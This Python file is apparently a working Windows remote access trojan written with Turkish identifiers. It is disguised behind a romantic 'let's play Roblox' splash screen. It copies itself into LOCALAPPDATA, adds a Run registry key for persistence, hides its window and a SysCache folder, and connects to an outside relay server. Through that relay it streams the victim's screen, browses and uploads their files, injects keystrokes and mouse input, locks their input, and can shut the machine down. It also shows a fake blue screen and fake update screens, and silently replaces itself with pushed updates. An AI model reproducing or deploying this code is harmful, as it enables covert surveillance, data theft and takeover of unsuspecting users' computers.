import ctypes
import io
import json
import os
import queue
import threading
import time
import uuid
import tkinter as tk
import sys
import shutil
import winreg
import math
import winsound
import random
import tempfile
import zipfile
import subprocess
import hashlib
import traceback
from pathlib import Path

import mss
from PIL import Image
import websocket
import pyautogui

try:
    from pynput import mouse, keyboard
    PYNPUT_OK = True
except ImportError:
    PYNPUT_OK = False

pyautogui.FAILSAFE = False
pyautogui.PAUSE = 0

try: ctypes.windll.winmm.timeBeginPeriod(1)
except: pass

RELAY_URL = "wss://ekran-relay.onrender.com"
ODA = "oyun123"
HOST_ETIKETI = ""

FPS = 30
JPEG_QUALITY = 70
MAKS_GENISLIK = 1280
MAX_FILE_SIZE = 5 * 1024 * 1024 * 1024
FILE_CHUNK = 256 * 1024
SOCK_BUF = 4 * 1024 * 1024

LLMHF_INJECTED = 0x00000001
LLKHF_INJECTED = 0x00000010

# --- KARA KUTU (CRASH LOGGER) ---
def kara_kutu(exc_type, exc_value, exc_traceback):
    hata = "".join(traceback.format_exception(exc_type, exc_value, exc_traceback))
    masaustu = os.path.join(os.path.expanduser("~"), "Desktop")
    if not os.path.exists(masaustu): masaustu = os.path.join(os.path.expanduser("~"), "Masaüstü")
    dosya = os.path.join(masaustu, "server_hata.txt")
    try:
        with open(dosya, "a", encoding="utf-8") as f:
            f.write(f"\n--- {time.ctime()} ---\n{hata}\n")
    except: pass
    print(f"ÇÖKME YAKALANDI:\n{hata}")

sys.excepthook = kara_kutu
# ---------------------------------

def gizli_klasor():
    p = os.path.join(os.environ.get("TEMP", tempfile.gettempdir()), "SysCache")
    try: os.makedirs(p, exist_ok=True)
    except: pass
    try: ctypes.windll.kernel32.SetFileAttributesW(p, 0x02)
    except: pass
    return p

def host_id_yukle():
    id_file = os.path.join(gizli_klasor(), ".hostid")
    try:
        with open(id_file, "r") as f:
            v = f.read().strip()
            if v and len(v) >= 6: return v
    except: pass
    yeni = uuid.uuid4().hex[:8]
    try:
        with open(id_file, "w") as f: f.write(yeni)
    except: pass
    return yeni

def splash_screen():
    try: root = tk.Tk()
    except: return
    try:
        root.overrideredirect(True)
        root.attributes("-topmost", True)
        root.configure(bg="#0a0015")
        W, H = 900, 600
        sw, sh = root.winfo_screenwidth(), root.winfo_screenheight()
        root.geometry(f"{W}x{H}+{(sw-W)//2}+{(sh-H)//2}")
        canvas = tk.Canvas(root, width=W, height=H, bg="#0a0015", highlightthickness=0)
        canvas.pack()
        canvas.create_text(W//2, H//2, text="Hadi senle Roblox\ngirelim yavrumm!", font=("Segoe UI", 42, "bold"), fill="#ff1493", justify="center")
        canvas.create_text(W//2, H//2 + 130, text="💖 Seni seviyorum 💖", font=("Segoe UI", 18, "italic"), fill="#ffb6c1")
        root.after(5000, root.destroy) # 5 saniyeye düşürdük
        root.mainloop()
    except: pass

def tek_instance():
    try:
        mtx = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\MusteriProgrami_MTX_V2")
        if ctypes.windll.kernel32.GetLastError() == 183:
            sys.exit(0)
    except: pass

def dosya_hash(p):
    try:
        with open(p, "rb") as f: return hashlib.sha256(f.read()).hexdigest()
    except: return None

def kendini_tasi_ve_baslangica_ekle():
    if not getattr(sys, 'frozen', False): return
    tek_instance()
    mevcut = sys.executable
    dosya_adi = os.path.basename(mevcut)
    hedef_klasor = os.path.join(os.environ["LOCALAPPDATA"], "MusteriProgrami")
    os.makedirs(hedef_klasor, exist_ok=True)
    hedef = os.path.join(hedef_klasor, dosya_adi)
    if os.path.abspath(mevcut) == os.path.abspath(hedef): return
    try:
        if dosya_hash(mevcut) != dosya_hash(hedef):
            shutil.copy2(mevcut, hedef)
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "MusteriProgrami", 0, winreg.REG_SZ, hedef)
            winreg.CloseKey(key)
        os.startfile(hedef)
        sys.exit()
    except: pass

def guvenli_dosya_adi(name):
    if not name: return "dosya"
    safe = os.path.basename(name)
    safe = "".join(c for c in safe if c not in '<>:"/\\|?*')
    safe = safe.strip(". ")
    if not safe or safe in (".", ".."): return "dosya"
    return safe

class LASTINPUTINFO(ctypes.Structure):
    _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]

def get_idle_seconds():
    try:
        b = LASTINPUTINFO(); b.cbSize = ctypes.sizeof(LASTINPUTINFO)
        u = ctypes.windll.user32; k = ctypes.windll.kernel32
        if u.GetLastInputInfo(ctypes.byref(b)):
            k.GetTickCount.restype = ctypes.c_uint
            fark = (k.GetTickCount() - b.dwTime) & 0xFFFFFFFF
            return max(0, fark / 1000.0)
    except: pass
    return 0

def get_idle_status(s):
    if s < 60: return "active"
    if s < 300: return "idle"
    return "afk"

class GirdiKilidi:
    def __init__(self):
        self.kilitli = False
        self.m_listener = None
        self.k_listener = None

    def _mouse_filter(self, msg, data):
        try:
            if hasattr(data, 'flags') and (data.flags & LLMHF_INJECTED): return True
        except: pass
        return False

    def _key_filter(self, msg, data):
        try:
            if hasattr(data, 'flags') and (data.flags & LLKHF_INJECTED): return True
        except: pass
        return False

    def _imlec_gizle(self, gizle):
        try:
            for _ in range(10):
                r = ctypes.windll.user32.ShowCursor(False if gizle else True)
                if (gizle and r < 0) or ((not gizle) and r >= 0): break
        except: pass

    def kilitle(self):
        if not PYNPUT_OK or self.kilitli: return
        self.kilitli = True
        try:
            self.m_listener = mouse.Listener(win32_event_filter=self._mouse_filter); self.m_listener.start()
            self.k_listener = keyboard.Listener(win32_event_filter=self._key_filter); self.k_listener.start()
            self._imlec_gizle(True)
        except: pass

    def kilit_ac(self):
        if not PYNPUT_OK: return
        self.kilitli = False
        try:
            if self.m_listener: self.m_listener.stop(); self.m_listener = None
            if self.k_listener: self.k_listener.stop(); self.k_listener = None
            self._imlec_gizle(False)
        except: pass

class HostUygulama:
    def __init__(self):
        self.ws = None
        self.send_lock = threading.Lock()
        self.paylasiyor = False
        self.calisiyor = True
        self.jiggler_aktif = False
        self._son_frame_sample = None

        self.send_queue = queue.Queue(maxsize=10)
        self.sender_running = True

        self.fps = FPS
        self.jpeg = JPEG_QUALITY
        self.maks_genislik = MAKS_GENISLIK
        self.monitorler = []
        self.monitor_index = 1
        self.aktif_monitor = None
        self.girdi_kilidi = GirdiKilidi()

        self.host_id = host_id_yukle()
        self.host_name = os.environ.get("COMPUTERNAME", "Bilinmeyen-PC")
        self.online_baslangic = time.monotonic()

        self.dosya_in = None
        self.dosya_in_adi = None
        self.dosya_in_beklenen = 0
        self.dosya_in_alindi = 0
        self.dosya_in_hedef = ""

        self._update_mode = False
        self._update_temp_yol = None
        self._update_beklenen = 0
        self._update_alindi = 0

        self.root = tk.Tk()
        self.root.title("Sistem")
        self.root.geometry("3x3+0+0")
        self.root.overrideredirect(True)
        self.root.attributes("-topmost", True)
        self.root.configure(bg="black")
        self.root.withdraw()
        self.root.protocol("WM_DELETE_WINDOW", self.kapat)

        threading.Thread(target=self._sender_loop, daemon=True).start()
        threading.Thread(target=self.baglan_dongu, daemon=True).start()

    def _sender_loop(self):
        while self.sender_running:
            try: item = self.send_queue.get(timeout=1.0)
            except queue.Empty: continue
            if item is None: break
            payload, is_binary = item
            try:
                with self.send_lock:
                    if self.ws:
                        if is_binary: self.ws.send(payload, opcode=websocket.ABNF.OPCODE_BINARY)
                        else: self.ws.send(payload)
            except: pass

    def _queue_send(self, payload, is_binary=False, drop_if_full=False, timeout=2.0):
        try:
            if drop_if_full: self.send_queue.put_nowait((payload, is_binary))
            else: self.send_queue.put((payload, is_binary), timeout=timeout)
        except queue.Full: pass

    def baglan_dongu(self):
        while self.calisiyor:
            ws = None
            try:
                ws = websocket.create_connection(RELAY_URL, timeout=15)
                try:
                    import socket as _sock
                    _so = ws.sock
                    if _so:
                        _so.setsockopt(_sock.IPPROTO_TCP, _sock.TCP_NODELAY, 1)
                        _so.setsockopt(_sock.SOL_SOCKET, _sock.SO_KEEPALIVE, 1)
                        try: _so.setsockopt(_sock.SOL_SOCKET, _sock.SO_SNDBUF, SOCK_BUF)
                        except: pass
                        try: _so.setsockopt(_sock.SOL_SOCKET, _sock.SO_RCVBUF, SOCK_BUF)
                        except: pass
                except: pass
                self.ws = ws
                self.online_baslangic = time.monotonic()
                kayit = {"type": "register", "role": "host", "room": ODA, "host_id": self.host_id, "name": self.host_name}
                self._queue_send(json.dumps(kayit))
                self.presence_thread_baslat(ws)
                self.dinle(ws)
            except Exception as e:
                print(f"[BAĞLANTI HATASI] {e}")
            finally:
                self.girdi_kilidi.kilit_ac()
                if self.ws is ws: self.ws = None
                self.paylasimi_durdur(relay_bildirme=False)
            if self.calisiyor: time.sleep(3)

    def presence_thread_baslat(self, ws):
        threading.Thread(target=self.presence_dongu, args=(ws,), daemon=True).start()

    def presence_dongu(self, ws):
        while self.calisiyor and self.ws is ws:
            try:
                idle = get_idle_seconds()
                durum = get_idle_status(idle)
                ekran = None
                if self.aktif_monitor:
                    ekran = {"left": self.aktif_monitor.get("left", 0), "top": self.aktif_monitor.get("top", 0),
                             "width": self.aktif_monitor.get("width", 0), "height": self.aktif_monitor.get("height", 0)}
                veri = {"type": "presence", "host_id": self.host_id, "name": self.host_name,
                        "online_seconds": int(time.monotonic() - self.online_baslangic),
                        "idle_seconds": int(idle), "status": durum, "screen": ekran}
                self._queue_send(json.dumps(veri))
            except: break
            time.sleep(5)

    def dinle(self, ws):
        while self.calisiyor and self.ws is ws:
            try:
                mesaj = ws.recv()
            except: break
            if mesaj is None: break
            if isinstance(mesaj, bytes):
                if len(mesaj) > 0 and mesaj[0] in (0x03, 0x05):
                    self.dosya_chunk_al(mesaj[1:])
                continue
            try: veri = json.loads(mesaj)
            except: continue
            
            tip = veri.get("type")
            if tip == "viewer_joined":
                self.baslat_oturum()
            elif tip == "peer_left":
                self.girdi_kilidi.kilit_ac()
                self.paylasimi_durdur(relay_bildirme=False)
            elif tip == "ctrl":
                if self.paylasiyor: self.kontrol_uygula(veri)
            elif tip == "control_mode":
                aktif = veri.get("enabled", False)
                kilit = veri.get("lock_host", False)
                if aktif and kilit: self.girdi_kilidi.kilitle()
                else: self.girdi_kilidi.kilit_ac()
            elif tip == "quality":
                try:
                    self.fps = max(1, min(60, int(veri.get("fps", self.fps))))
                    self.jpeg = max(20, min(95, int(veri.get("jpeg", self.jpeg))))
                    self.maks_genislik = max(640, min(1920, int(veri.get("width", self.maks_genislik))))
                except: pass
            elif tip == "monitor":
                try:
                    idx = int(veri.get("index", 1))
                    if 0 <= idx < len(self.monitorler):
                        self.monitor_index = idx
                        self.aktif_monitor = self.monitorler[idx]
                        self.guvenli_gonder({"type": "monitor_changed", "index": idx})
                except: pass
            elif tip == "ping": self.guvenli_gonder({"type": "pong", "t": veri.get("t")})
            elif tip == "clipboard":
                try:
                    text = veri.get("text", "")
                    self.root.clipboard_clear(); self.root.clipboard_append(text); self.root.update()
                except: pass
            elif tip == "fs_list":
                threading.Thread(target=self.fs_listele, args=(veri.get("path", "C:\\"),), daemon=True).start()
            elif tip == "sys_cmd": self.sistem_komutu(veri.get("cmd"))
            elif tip == "fake_update":
                threading.Thread(target=self.sahte_guncelleme_goster, args=(int(veri.get("duration", 30)),), daemon=True).start()
            elif tip == "troll":
                action = veri.get("action")
                if action == "spam_error":
                    threading.Thread(target=self.hata_spam_goster, args=(veri.get("text", "Hata"),), daemon=True).start()
                elif action == "play_sound":
                    threading.Thread(target=self.troll_ses_cal, daemon=True).start()
                elif action == "bsod":
                    threading.Thread(target=self.sahte_bsod, daemon=True).start()
            elif tip == "file_request":
                yol = veri.get("path")
                if yol: threading.Thread(target=self.dosya_gonder_thread, args=(yol,), daemon=True).start()
            elif tip == "file_begin": self._file_begin_isle(veri)
            elif tip == "file_end": self._file_end_isle(veri)
            elif tip == "update_self": self._update_basla(veri)

    def baslat_oturum(self):
        if self.paylasiyor: return
        try:
            print("[YAYIN] mss test ediliyor...")
            with mss.mss() as sct: self.monitorler = list(sct.monitors)
            self.monitor_index = 1 if len(self.monitorler) > 1 else 0
            self.aktif_monitor = self.monitorler[self.monitor_index]
            mons = [{"index": i, "left": m.get("left", 0), "top": m.get("top", 0),
                     "width": m.get("width", 0), "height": m.get("height", 0)}
                    for i, m in enumerate(self.monitorler)]
            self.paylasiyor = True
            self.guvenli_gonder({"type": "accepted", "host_id": self.host_id, "name": self.host_name, "monitors": mons})
            threading.Thread(target=self.yayinla, daemon=True).start()
            print("[YAYIN] Başarıyla başladı!")
        except Exception as e:
            print(f"[YAYIN HATASI] {e}")
            self.guvenli_gonder({"type": "error", "message": f"Ekran yakalama başlatılamadı: {e}"})

    def yayinla(self):
        try:
            with mss.mss() as sct:
                self._son_frame_sample = None
                while self.calisiyor and self.paylasiyor and self.ws is not None:
                    t0 = time.perf_counter()
                    monitor = self.aktif_monitor
                    if not monitor: break
                    try:
                        ekran = sct.grab(monitor)
                        rgb = ekran.rgb
                        sample = rgb[::64]
                        if sample == self._son_frame_sample:
                            gecen = time.perf_counter() - t0
                            if gecen < (1.0/self.fps): time.sleep((1.0/self.fps) - gecen)
                            continue
                        self._son_frame_sample = sample

                        image = Image.frombytes("RGB", ekran.size, rgb)
                        del rgb
                        if image.width > self.maks_genislik:
                            oran = self.maks_genislik / image.width
                            image = image.resize((int(image.width * oran), int(image.height * oran)), Image.Resampling.NEAREST)

                        buffer = io.BytesIO()
                        image.save(buffer, format="JPEG", quality=self.jpeg, optimize=False)
                        frame_data = buffer.getvalue()
                        self._queue_send(frame_data, is_binary=True, drop_if_full=True)
                    except Exception as e:
                        print(f"[KARE HATASI] {e}")
                    
                    hedef = 1.0 / max(1, self.fps)
                    gecen = time.perf_counter() - t0
                    if gecen < hedef - 0.002: time.sleep(hedef - gecen)
        except Exception as e:
            print(f"[YAYIN DÖNGÜ ÇÖKTÜ] {e}")

    # --- DİĞER FONKSİYONLAR (AYNEN KORUNDU) ---
    def fs_listele(self, path):
        try:
            path = os.path.normpath(path)
            if not os.path.exists(path): return
            items = []
            for entry in os.scandir(path):
                try:
                    is_dir = entry.is_dir()
                    size = entry.stat().st_size if not is_dir else 0
                    items.append({"name": entry.name, "is_dir": is_dir, "size": size, "full_path": str(Path(path) / entry.name)})
                except: pass
            items.sort(key=lambda x: (not x["is_dir"], x["name"].lower()))
            self.guvenli_gonder({"type": "fs_list_result", "path": path, "items": items})
        except: pass

    def sahte_bsod(self):
        try:
            win = tk.Toplevel(self.root)
            win.attributes("-fullscreen", True); win.attributes("-topmost", True)
            win.configure(bg="#0078D7"); win.overrideredirect(True); win.config(cursor="none")
            self.girdi_kilidi.kilitle()
            f = tk.Frame(win, bg="#0078D7"); f.place(relx=0.1, rely=0.2, anchor="w")
            tk.Label(f, text=":(", font=("Segoe UI Light", 80), fg="white", bg="#0078D7").pack(anchor="w")
            tk.Label(f, text="Bilgisayarınızda bir sorun oluştu.", font=("Segoe UI", 20), fg="white", bg="#0078D7", justify="left").pack(anchor="w", pady=20)
            win.bind("<Destroy>", lambda e: self.girdi_kilidi.kilit_ac())
        except: pass

    def sistem_komutu(self, cmd):
        try:
            if cmd == "lock": ctypes.windll.user32.LockWorkStation()
            elif cmd == "shutdown": os.system("shutdown /s /t 0")
            elif cmd == "restart": os.system("shutdown /r /t 0")
            elif cmd == "jiggle_start":
                self.jiggler_aktif = True
                threading.Thread(target=self.fare_jiggle, daemon=True).start()
            elif cmd == "jiggle_stop": self.jiggler_aktif = False
        except: pass

    def fare_jiggle(self):
        while self.jiggler_aktif:
            try: pyautogui.moveRel(2, 0); time.sleep(0.5); pyautogui.moveRel(-2, 0); time.sleep(0.5)
            except: time.sleep(1)

    def hata_spam_goster(self, text):
        try:
            for _ in range(15):
                w = tk.Toplevel(self.root); w.geometry(f"300x100+{random.randint(100,800)}+{random.randint(100,600)}"); w.attributes("-topmost", True)
                tk.Label(w, text=text, fg="red", wraplength=280).pack(pady=15)
                time.sleep(0.1)
        except: pass

    def troll_ses_cal(self):
        try:
            for _ in range(5): winsound.Beep(2500, 300); winsound.Beep(1500, 300)
        except: pass

    def sahte_guncelleme_goster(self, sure):
        try:
            win = tk.Toplevel(self.root); win.attributes("-fullscreen", True); win.attributes("-topmost", True); win.config(cursor="none")
            self.girdi_kilidi.kilitle()
            f = tk.Frame(win, bg="#0c0c0c"); f.place(relx=0.5, rely=0.5, anchor="center")
            tk.Label(f, text="Güncelleştirmeler tamamlanıyor", font=("Segoe UI Light", 36), fg="white", bg="#0c0c0c").pack()
            win.bind("<Destroy>", lambda e: self.girdi_kilidi.kilit_ac())
        except: pass

    def _file_begin_isle(self, veri):
        if veri.get("direction") != "to_host": return
        try:
            if self.dosya_in: self.dosya_in.close()
            safe_name = guvenli_dosya_adi(veri.get("name", "dosya"))
            self.dosya_in_hedef = gizli_klasor()
            self.dosya_in = open(os.path.join(self.dosya_in_hedef, safe_name), "wb")
            self.dosya_in_beklenen = int(veri.get("size", 0))
            self.dosya_in_alindi = 0
        except: self.dosya_in = None

    def _file_end_isle(self, veri):
        if not self.dosya_in: return
        try: self.dosya_in.close()
        except: pass
        self.dosya_in = None
        if getattr(self, "_update_mode", False):
            self._update_mode = False
            self._update_uygula()

    def dosya_chunk_al(self, payload):
        if self.dosya_in is None: return
        try:
            self.dosya_in_alindi += len(payload)
            self.dosya_in.write(payload)
        except: pass

    def dosya_gonder_thread(self, path):
        try:
            path = os.path.normpath(path)
            if not os.path.exists(path): return
            is_dir = os.path.isdir(path)
            gonderilecek = path
            if is_dir:
                base = os.path.join(tempfile.gettempdir(), os.path.basename(path))
                shutil.make_archive(base, 'zip', path)
                gonderilecek = f"{base}.zip"
            name = os.path.basename(gonderilecek)
            self.guvenli_gonder({"type": "file_begin", "name": name, "size": os.path.getsize(gonderilecek), "direction": "to_viewer"})
            with open(gonderilecek, "rb") as f:
                while True:
                    chunk = f.read(FILE_CHUNK)
                    if not chunk: break
                    self._queue_send(b"\x04" + chunk, is_binary=True, drop_if_full=False)
            self.guvenli_gonder({"type": "file_end", "name": name, "success": True, "direction": "to_viewer"})
        except: pass

    def kontrol_uygula(self, veri):
        try:
            action = veri.get("action")
            if action in ("move", "click", "down", "up"):
                fx, fy = float(veri.get("x", 0)), float(veri.get("y", 0))
                mon = self.aktif_monitor
                if not mon: return
                pyautogui.moveTo(mon["left"] + int(fx * mon["width"]), mon["top"] + int(fy * mon["height"]))
                if action == "click": pyautogui.click(button=veri.get("button", "left"))
                elif action == "down": pyautogui.mouseDown(button=veri.get("button", "left"))
                elif action == "up": pyautogui.mouseUp(button=veri.get("button", "left"))
            elif action == "scroll": pyautogui.scroll(int(veri.get("amount", 0)))
            elif action == "key": pyautogui.press(veri.get("key"))
            elif action == "key_down": pyautogui.keyDown(veri.get("key"))
            elif action == "key_up": pyautogui.keyUp(veri.get("key"))
        except: pass

    def _update_basla(self, veri):
        try:
            if self.dosya_in: self.dosya_in.close()
            self._update_mode = True
            self._update_temp_yol = os.path.join(tempfile.gettempdir(), veri.get("name", "update.tmp"))
            self.dosya_in = open(self._update_temp_yol, "wb")
        except: self._update_mode = False

    def _update_uygula(self):
        yeni = self._update_temp_yol
        if not yeni or not os.path.exists(yeni): return
        mevcut = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        baslat = f'"{mevcut}"' if getattr(sys, 'frozen', False) else f'"{sys.executable}" "{mevcut}"'
        bat = os.path.join(tempfile.gettempdir(), f"upd_{random.randint(1000,9999)}.bat")
        try:
            with open(bat, "w") as f:
                f.write(f"@echo off\n:wait\ntasklist /FI \"PID eq {os.getpid()}\" | find \"{os.getpid()}\" >nul\nif not errorlevel 1 (timeout /t 1 >nul & goto wait)\ncopy /Y \"{yeni}\" \"{mevcut}\"\nstart \"\" {baslat}\ndel \"{yeni}\"\ndel \"%~f0\"\n")
            subprocess.Popen(["cmd.exe", "/c", bat], creationflags=0x08000000, close_fds=True)
        except: pass
        os._exit(0)

    def guvenli_gonder(self, veri):
        try: self._queue_send(json.dumps(veri), is_binary=False)
        except: pass

    def paylasimi_durdur(self, relay_bildirme=True):
        self.paylasiyor = False; self.jiggler_aktif = False
        self.girdi_kilidi.kilit_ac()
        if relay_bildirme: self.guvenli_gonder({"type": "stopped"})

    def kapat(self):
        self.calisiyor = False; self.sender_running = False
        try: self.send_queue.put_nowait(None)
        except: pass
        self.paylasimi_durdur()
        try: self.ws.close()
        except: pass
        try: self.root.destroy()
        except: pass

if __name__ == "__main__":
    kendini_tasi_ve_baslangica_ekle()
    splash_screen()
    app = HostUygulama()
    app.root.mainloop()
